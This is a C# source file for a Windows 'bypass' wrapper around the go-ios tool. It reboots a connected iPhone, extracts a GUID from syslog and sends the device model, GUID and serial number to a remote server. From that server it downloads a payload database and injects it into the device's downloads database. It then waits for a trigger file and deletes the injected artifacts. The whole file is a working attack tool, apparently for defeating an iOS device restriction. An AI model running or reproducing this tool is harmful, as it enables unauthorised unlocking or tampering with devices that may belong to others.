using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Text.Json;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Collections.Generic;

namespace GoIosBypassSuite
{
    // Data models for parsing go-ios JSON output
    public class GoIosDevice
    {
        public string Udid { get; set; }
        public string DeviceName { get; set; }
        public string ProductVersion { get; set; }
        public string ProductType { get; set; }
        public string HardwareModel { get; set; }
        // go-ios returns "DeviceValues" or similar keys depending on version
        public Dictionary<string, object> DeviceValues { get; set; }
    }

    class Program
    {
        // ==========================================
        // CONFIGURATION
        // ==========================================
        private const string TOOL_EXEC = "iOS.exe"; // Your precompiled go-ios executable
        private const string REMOTE_API = "https://albert.ip-info.me/files/get.php";
        private const int TRIGGER_TIMEOUT = 300;
        
        // ==========================================
        // STATE
        // ==========================================
        private static readonly HttpClient _httpClient = new HttpClient();
        private static GoIosDevice _targetDevice;
        private static Process _tunnelProcess;

        static async Task Main(string[] args)
        {
            Console.Title = "Go-iOS Windows Bypass Wrapper";
            PrintBanner();

            try
            {
                // 1. Environment & Security
                CheckEnvironment();
                
                // 2. Device Handshake
                Console.WriteLine("[*] Waiting for device...");
                _targetDevice = await WaitForDevice(30);
                PrintDeviceInfo(_targetDevice);

                // 3. Start Tunnel (Crucial for Windows support)
                StartTunnelDaemon();

                Console.WriteLine("\n[!] Press ENTER to begin the sequence...");
                Console.ReadLine();

                // 4. Main Sequence
                await RunSequence();
            }
            catch (Exception ex)
            {
                Log.Error($"Fatal: {ex.Message}");
            }
            finally
            {
                CleanupTunnel();
                Console.WriteLine("[*] Process terminated. Press any key to exit.");
                Console.ReadKey();
            }
        }

        private static async Task RunSequence()
        {
            // STEP 1: Reboot
            Log.Header("Phase 1: Initial Reset");
            RunGoIosCommand("reboot");
            await WaitForDeviceReconnection(120);

            // STEP 2: Syslog & GUID
            Log.Header("Phase 2: Identity Token Extraction");
            string guid = await ExtractGuidFromSyslog();
            Log.Success($"Target GUID: {guid}");

            // STEP 3: API Handshake
            Log.Header("Phase 3: Server Authorization");
            string downloadUrl = await GetPayloadUrl(_targetDevice.ProductType, guid, GetSerialNumber(_targetDevice));
            Log.Info($"Payload URL: {downloadUrl}");

            // STEP 4: Download Payload
            Log.Header("Phase 4: Payload Acquisition");
            string localFile = "payload.db";
            await DownloadFile(downloadUrl, localFile);

            // STEP 5: Cleanup Old Files
            Log.Header("Phase 5: Artifact Sanitation");
            RemoveRemoteFile("/Downloads/downloads.28.sqlitedb");
            RemoveRemoteFile("/Downloads/downloads.28.sqlitedb-shm");
            RemoveRemoteFile("/Downloads/downloads.28.sqlitedb-wal");

            // STEP 6: Injection
            Log.Header("Phase 6: Payload Injection");
            PushFile(localFile, "/Downloads/downloads.28.sqlitedb");
            File.Delete(localFile); // Clean local temp

            // STEP 7: Reboot
            Log.Header("Phase 7: Application Reboot");
            RunGoIosCommand("reboot");
            await WaitForDeviceReconnection(300);

            // STEP 8: Metadata Check
            Log.Header("Phase 8: Verifying iTunes Metadata");
            if (!await WaitForRemoteFile("/iTunes_Control/iTunes/iTunesMetadata.plist", 30))
            {
                Log.Warn("Metadata file missing, continuing riskily...");
            }

            // STEP 9: Final Trigger Sequence
            Log.Header("Phase 9: Trigger Monitor");
            RunGoIosCommand("reboot");
            await WaitForDeviceReconnection(300);

            Log.Info("Waiting for trigger asset (asset.epub)...");
            if (await WaitForRemoteFile("/Books/asset.epub", TRIGGER_TIMEOUT))
            {
                Log.Success("Trigger detected! Finalizing...");
                
                // Wait for metadata to vanish
                await WaitForRemoteFileDisappearance("/iTunes_Control/iTunes/iTunesMetadata.plist", 300);
                
                // Delete trigger
                RemoveRemoteFile("/Books/asset.epub");
                
                // Cleanup downloads
                RemoveRemoteFile("/Downloads/downloads.28.sqlitedb");
                RemoveRemoteFile("/Downloads/downloads.28.sqlitedb-shm");
                RemoveRemoteFile("/Downloads/downloads.28.sqlitedb-wal");

                // Final Reboot
                RunGoIosCommand("reboot");
                Log.Success("Sequence Complete.");
            }
            else
            {
                Log.Error("Trigger timeout. Sequence failed.");
            }
        }

        // ==========================================
        // GO-IOS WRAPPERS
        // ==========================================

        private static void StartTunnelDaemon()
        {
            Log.Info("Starting iOS Tunnel Daemon...");
            try
            {
                // go-ios tunnel command - runs in background
                var startInfo = new ProcessStartInfo
                {
                    FileName = TOOL_EXEC,
                    Arguments = "tunnel start",
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true
                };

                _tunnelProcess = Process.Start(startInfo);
                Thread.Sleep(3000); // Give it time to initialize

                if (_tunnelProcess.HasExited)
                {
                    string err = _tunnelProcess.StandardError.ReadToEnd();
                    throw new Exception($"Tunnel failed to start: {err}");
                }
                Log.Success("Tunnel active.");
            }
            catch (Exception ex)
            {
                throw new Exception($"Could not create tunnel: {ex.Message}");
            }
        }

        private static void CleanupTunnel()
        {
            if (_tunnelProcess != null && !_tunnelProcess.HasExited)
            {
                try { _tunnelProcess.Kill(); } catch { }
            }
        }

        private static string RunGoIosCommand(string args, bool returnJson = false)
        {
            // Append --nojson if we specifically DON'T want json, 
            // but go-ios defaults to JSON usually. 
            // We will rely on the tool's default behavior.
            
            var psi = new ProcessStartInfo
            {
                FileName = TOOL_EXEC,
                Arguments = args,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };

            using (var p = Process.Start(psi))
            {
                string output = p.StandardOutput.ReadToEnd();
                string error = p.StandardError.ReadToEnd();
                p.WaitForExit();

                if (p.ExitCode != 0 && !string.IsNullOrEmpty(error))
                {
                    // Some commands write to stderr but succeed, basic check
                    if (!error.Contains("warn", StringComparison.OrdinalIgnoreCase))
                        Log.Warn($"Command '{args}' error: {error.Trim()}");
                }

                return output;
            }
        }

        private static void PushFile(string localPath, string remotePath)
        {
            Log.Detail($"Pushing {localPath} -> {remotePath}");
            // go-ios fsync push --srcPath=X --dstPath=Y
            RunGoIosCommand($"fsync push --srcPath=\"{localPath}\" --dstPath=\"{remotePath}\"");
        }

        private static void RemoveRemoteFile(string remotePath)
        {
            Log.Detail($"Deleting {remotePath}");
            // go-ios fsync rm --path=X
            RunGoIosCommand($"fsync rm --path=\"{remotePath}\"");
        }

        private static async Task<bool> WaitForRemoteFile(string remotePath, int timeoutSeconds)
        {
            var end = DateTime.Now.AddSeconds(timeoutSeconds);
            while (DateTime.Now < end)
            {
                // Use 'tree' or 'ls' to check existence. 
                // go-ios fsync tree --path=/Books returns JSON or file list
                string output = RunGoIosCommand($"fsync tree --path=\"{remotePath}\"");
                
                // Check if output contains the filename or valid JSON entry
                if (!string.IsNullOrWhiteSpace(output) && !output.Contains("no such file") && !output.Contains("error"))
                    return true;

                await Task.Delay(2000);
            }
            return false;
        }

        private static async Task WaitForRemoteFileDisappearance(string remotePath, int timeoutSeconds)
        {
            var end = DateTime.Now.AddSeconds(timeoutSeconds);
            while (DateTime.Now < end)
            {
                string output = RunGoIosCommand($"fsync tree --path=\"{remotePath}\"");
                // If we get an error or empty result, file is likely gone
                if (string.IsNullOrWhiteSpace(output) || output.Contains("no such file") || output.Contains("error"))
                    return;
                    
                await Task.Delay(2000);
            }
        }

        private static async Task<string> ExtractGuidFromSyslog()
        {
            Log.Info("Scanning syslog for BLDatabaseManager...");
            
            // We launch syslog and read stream for a fixed time
            var psi = new ProcessStartInfo
            {
                FileName = TOOL_EXEC,
                Arguments = "syslog",
                UseShellExecute = false,
                RedirectStandardOutput = true,
                CreateNoWindow = true
            };

            using (var p = Process.Start(psi))
            {
                var cts = new CancellationTokenSource();
                string foundGuid = null;
                
                // Read loop
                Task.Run(async () => 
                {
                    string line;
                    while ((line = await p.StandardOutput.ReadLineAsync()) != null)
                    {
                        if (line.Contains("BLDatabaseManager.sqlite"))
                        {
                            var match = Regex.Match(line, @"SystemGroup/([A-F0-9\-]{36})");
                            if (match.Success)
                            {
                                foundGuid = match.Groups[1].Value;
                                cts.Cancel(); // Stop waiting
                            }
                        }
                    }
                }, cts.Token);

                // Wait max 60 seconds
                try { await Task.Delay(60000, cts.Token); } catch (TaskCanceledException) { }

                try { p.Kill(); } catch { }

                if (foundGuid == null) throw new Exception("GUID not found in logs.");
                return foundGuid;
            }
        }

        // ==========================================
        // HELPERS
        // ==========================================

        private static async Task<GoIosDevice> WaitForDevice(int timeoutSec)
        {
            var end = DateTime.Now.AddSeconds(timeoutSec);
            while (DateTime.Now < end)
            {
                string json = RunGoIosCommand("list --details");
                try
                {
                    // go-ios returns a list of devices. 
                    // Warning: format might be `{"devices": [...]}` or raw array depending on version.
                    // We assume a simple list or wrapper here. 
                    // For robustness, we'll try to just grab the first object.
                    
                    if (json.Contains("UDID"))
                    {
                        // Simple hacky parse if full JSON model fails or is complex
                        var devices = JsonSerializer.Deserialize<List<GoIosDevice>>(json);
                        if (devices != null && devices.Count > 0) return devices[0];
                    }
                    
                    // Alternative: sometimes it wraps in a "devices" key
                     var root = JsonDocument.Parse(json);
                     if (root.RootElement.TryGetProperty("devices", out var devArray) && devArray.GetArrayLength() > 0)
                     {
                         var first = devArray[0];
                         return new GoIosDevice 
                         { 
                             Udid = first.GetProperty("UDID").GetString(),
                             DeviceName = first.GetProperty("DeviceName").GetString(),
                             ProductType = first.GetProperty("ProductType").GetString()
                         };
                     }
                }
                catch { /* Parsing failed, wait */ }
                
                await Task.Delay(2000);
            }
            throw new Exception("No device detected.");
        }

        private static async Task WaitForDeviceReconnection(int timeoutSec)
        {
            Log.Info("Waiting for reconnection...");
            await Task.Delay(10000); // Grace period
            await WaitForDevice(timeoutSec);
            Log.Success("Device Reconnected.");
        }

        private static async Task<string> GetPayloadUrl(string model, string guid, string sn)
        {
            var url = $"{REMOTE_API}?prd={model}&guid={guid}&sn={sn}";
            var response = await _httpClient.GetStringAsync(url);
            return response.Trim();
        }

        private static async Task DownloadFile(string url, string path)
        {
            var data = await _httpClient.GetByteArrayAsync(url);
            await File.WriteAllBytesAsync(path, data);
        }

        private static string GetSerialNumber(GoIosDevice device)
        {
            // Try parsing the values dictionary if standard property is missing
            if (device.DeviceValues != null && device.DeviceValues.ContainsKey("SerialNumber"))
                return device.DeviceValues["SerialNumber"].ToString();
            
            // Fallback: run distinct info command if needed, 
            // but list --details usually has it.
            return "UNKNOWN_SN"; 
        }

        private static void CheckEnvironment()
        {
            if (!File.Exists(TOOL_EXEC))
            {
                throw new FileNotFoundException($"Cannot find {TOOL_EXEC}. Please place it next to this program.");
            }
        }

        private static void PrintDeviceInfo(GoIosDevice d)
        {
            Log.Info($"Connected: {d.DeviceName} ({d.ProductType})");
            Log.Info($"UDID: {d.Udid}");
        }

        private static void PrintBanner()
        {
            Console.Clear();
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine("--- Go-iOS Windows Wrapper ---");
            Console.ResetColor();
            Console.WriteLine();
        }
    }

    // Simple Logger
    static class Log
    {
        public static void Info(string m) => Write(ConsoleColor.White, "[*] " + m);
        public static void Success(string m) => Write(ConsoleColor.Green, "[+] " + m);
        public static void Warn(string m) => Write(ConsoleColor.Yellow, "[!] " + m);
        public static void Error(string m) => Write(ConsoleColor.Red, "[-] " + m);
        public static void Header(string m) { Console.WriteLine(); Write(ConsoleColor.Magenta, "=== " + m + " ==="); }
        public static void Detail(string m) => Write(ConsoleColor.DarkGray, "    -> " + m);

        private static void Write(ConsoleColor c, string m)
        {
            Console.ForegroundColor = c;
            Console.WriteLine(m);
            Console.ResetColor();
        }
    }
}
